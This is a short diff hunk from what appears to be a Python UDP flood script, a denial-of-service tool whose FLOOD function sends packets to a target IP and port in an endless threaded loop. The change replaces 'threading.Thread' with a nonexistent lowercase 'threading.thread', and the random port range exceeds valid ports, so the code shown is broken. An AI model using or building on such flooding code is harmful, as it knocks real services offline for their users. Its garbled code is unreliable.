@@ -10,6 +10,6 @@ def FLOOD():
     port=(random.randint(1,15000000),port)[randport]
     s.sendto(bytes,(ip,port))
     while True:
-        t1 = threading.Thread(target=FLOOD)
+        t1 = threading.thread(target=FLOOD)
         t2 = threading.thread(target=FLOOD)
 FLOOD()
